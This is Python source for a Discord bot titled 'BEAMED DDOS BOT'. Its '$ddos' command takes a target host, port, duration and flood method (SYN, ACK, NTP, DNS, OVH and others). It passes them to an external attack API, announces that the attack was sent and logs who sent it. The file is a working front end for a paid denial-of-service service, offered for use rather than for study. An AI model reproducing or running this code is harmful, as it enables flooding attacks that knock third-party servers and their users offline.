token = ""
api = ""

import datetime
import aiohttp
import requests
import random
import asyncio
from threading import Thread
from discord.ext.commands import Bot
from urllib.request import urlopen
from urllib.request import Request, urlopen
from discord.voice_client import VoiceClient
from discord.ext import commands
import discord
import json
import os

prefix = ["$"]
start_time = datetime.datetime.utcnow()

bot = commands.Bot(command_prefix=prefix)
bot.remove_command("help")

async def status_task():
    while True:
        activity = discord.Game(name=f" with {len(set(bot.get_all_members()))} members", type=3)
        await bot.change_presence(status=discord.Status.dnd, activity=activity)
        await asyncio.sleep(10)
        activity = discord.Game(name=f".gg/beamed | $help", type=3)
        await bot.change_presence(status=discord.Status.dnd, activity=activity)
        await asyncio.sleep(10)

@bot.event
async def on_ready():
    print("Bot is ready.")
    ...
    bot.loop.create_task(status_task())

@bot.command()
async def methods (ctx):
    embed=discord.Embed(title="BEAMED DDOS BOT METHODS", description="HOME \n STOMP \n PLAIN \n ACK \n SNMP \n PLEX \n STUN \n NTP \n DNS \n DVR \n FIVEM \n HYDRA \n CPU \n TCP \n EQUINOX \n 100UP \n NFO \n OVH \n WRA \n SYN \n ODIN \n JENKINS \n GUNTHER \n HTTP \n HTTPv2", color=0xd20f0f)
    embed.set_footer(text=f"Max time = 300\n Max Concurrents = 4")   
    await ctx.send(embed=embed)

@bot.command(name='ddos')
@commands.has_any_role(811041516595839006,820742011891220510,825570621274325053)#<--------------------- the exact role name (same spelling) you want users to have
@commands.cooldown(1, 120, commands.BucketType.user) #<---------- 120 can be replaced for the time you want each user to be on cooldown!
async def ddos(ctx, arg1, arg2, arg3:int, arg4):
 channel123 = bot.get_channel(821167495293435934)
 try:
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://{api}&host={arg1}&port={arg2}&time={arg3}&method={arg4}") as r: 
            b = await r.text()
            print(b)
            message = await ctx.send("**looking up host**")
            await asyncio.sleep(2)
            await message.edit(content=f"**loading lists**")
            await asyncio.sleep(2)
            await message.edit(content=f"**sending packets**")
            await asyncio.sleep(1)
            embed = discord.Embed(title='**Attack has been sent! (ROCKET)**', color=0x2f3136)
            embed.set_thumbnail(
                url=ctx.guild.icon_url)
            embed.add_field(name='**Host**', value=f"``{arg1}``", inline=False)
            embed.add_field(name='**Port**', value=f"``{arg2}``", inline=False)
            embed.add_field(name='**Time**', value=f"``{arg3}``", inline=False)
            embed.add_field(name="**Method**", value=f"``{arg4}``", inline=False)
            embed.set_footer(text=f"Attack was sent by {ctx.author.name}#{ctx.author.discriminator}")   
            await ctx.send(embed=embed)  
            await channel123.send(f"{b} was sent by {ctx.author.name}#{ctx.author.discriminator}")   
 except:
     await ctx.send("error")

#DO NOT DELETE:
#           "6f/77/6e/65/64/20/62/79/20/70/68/61/6e/74/6f/6d/20/73/65/72/76/69/63/65/73/2e"

bot.run(token)
